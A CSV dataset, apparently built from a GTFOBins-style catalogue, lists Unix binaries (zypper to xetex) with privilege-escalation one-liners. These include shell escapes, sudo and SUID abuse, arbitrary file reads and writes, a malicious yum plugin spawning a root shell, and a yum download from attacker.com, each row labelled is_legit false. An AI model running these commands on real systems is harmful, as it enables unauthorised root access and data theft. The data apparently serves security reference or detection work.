"Name","functions","functions_shell","functions_shell_description","functions_shell_code","functions_sudo","functions_sudo_description","functions_sudo_code","description","functions_file-read","functions_file-read_code","functions_suid","functions_suid_code","functions_file-write","functions_file-write_code","functions_limited-suid","functions_limited-suid_code","functions_file-download","functions_file-download_description","functions_file-download_code","functions_file-read_description","functions_suid_description","functions_non-interactive-reverse-shell","functions_non-interactive-reverse-shell_description","functions_non-interactive-reverse-shell_code","functions_command","functions_command_description","functions_command_code","functions_file-upload","functions_file-upload_description","functions_file-upload_code","functions_file-write_description","functions_reverse-shell","functions_reverse-shell_description","functions_reverse-shell_code","functions_non-interactive-bind-shell","functions_non-interactive-bind-shell_description","functions_non-interactive-bind-shell_code","functions_library-load","functions_library-load_description","functions_library-load_code","functions_capabilities","functions_capabilities_description","functions_capabilities_code","functions_limited-suid_description","functions_bind-shell","functions_bind-shell_description","functions_bind-shell_code","is_legit"
"zypper","","This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.","[''zypper x ''-|-''TF=$(mktemp -d) cp /bin/sh $TF/zypper-x export PATH=$TF:$PATH zypper x '']","","This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.","[''sudo zypper x ''-|-''TF=$(mktemp -d) cp /bin/sh $TF/zypper-x sudo PATH=$TF:$PATH zypper x'']","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"zsoelim","","","","","","LFILE=file_to_read sudo zsoelim ""$LFILE""","The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.","","LFILE=file_to_read zsoelim ""$LFILE""","","LFILE=file_to_read ./zsoelim ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"zsh","","","zsh","","","sudo zsh","","","export LFILE=file_to_read zsh -c 'echo ""$(<$LFILE)""'","","./zsh","","export LFILE=file_to_write zsh -c 'echo DATA >$LFILE'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"zip","","","TF=$(mktemp -u) zip $TF /etc/hosts -T -TT 'sh #' rm $TF","","","TF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF","","","LFILE=file-to-read TF=$(mktemp -u) zip $TF $LFILE unzip -p $TF","","","","","","TF=$(mktemp -u) ./zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"zathura","","","zathura :! /bin/sh -c 'exec /bin/sh 0<&1'","","","sudo zathura :! /bin/sh -c 'exec /bin/sh 0<&1'","The interaction happens in a GUI window, while the shell is dropped in the terminal.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"yum","","","","","[''It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` TF=$(mktemp -d) echo 'id' > $TF/x.sh fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF ``` ''-|-''Spawn interactive root shell by loading a custom plugin. '']","[''sudo yum localinstall -y x-1.0-1.noarch.rpm ''-|-''TF=$(mktemp -d) cat >$TF/x<<EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF  cat >$TF/y.conf<<EOF [main] enabled=1 EOF  cat >$TF/y.py<<EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version='2.1' def init_hook(conduit):   os.execl('/bin/sh','/bin/sh') EOF  sudo yum -c $TF/x --enableplugin=y'']","","","","","","","","","","","Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`.","RHOST=attacker.com RFILE=file_to_get.rpm yum install http://$RHOST/$RFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"yelp","","","","","","","","","LFILE=file_to_read yelp ""man:$LFILE""","","","","","","","","","","This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"yash","","","yash","","","sudo yash","","","","","./yash","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"yarn","","Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `yarn --cwd $TF run preinstall`.","[''yarn exec /bin/sh''-|-''TF=$(mktemp -d) echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json yarn --cwd $TF install '']","","","sudo yarn exec /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xz","","","","","","LFILE=file_to_read sudo xz -c ""$LFILE"" | xz -d","","","LFILE=file_to_read xz -c ""$LFILE"" | xz -d","","LFILE=file_to_read ./xz -c ""$LFILE"" | xz -d","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xxd","","","","","","LFILE=file_to_read sudo xxd ""$LFILE"" | xxd -r","","","LFILE=file_to_read xxd ""$LFILE"" | xxd -r","","LFILE=file_to_read ./xxd ""$LFILE"" | xxd -r","","LFILE=file_to_write echo DATA | xxd | xxd -r - ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xpad","","","","","","LFILE=file_to_read sudo xpad -f ""$LFILE""","This is a GUI application. The file content is displayed in a sticky note.","","LFILE=file_to_read xpad -f ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xmore","","","","","","LFILE=file_to_read sudo xmore $LFILE","The file is displayed in a Xorg window, so it needs a working graphical environment.","","LFILE=file_to_read xmore $LFILE","","LFILE=file_to_read ./xmore $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xmodmap","","","","","","LFILE=file_to_read sudo xmodmap -v $LFILE","The read file content is corrupted by error prints.","","LFILE=file_to_read xmodmap -v $LFILE","","LFILE=file_to_read ./xmodmap -v $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xetex","","","xetex --shell-escape '\write18{/bin/sh}\end'","","","sudo xetex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","./xetex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
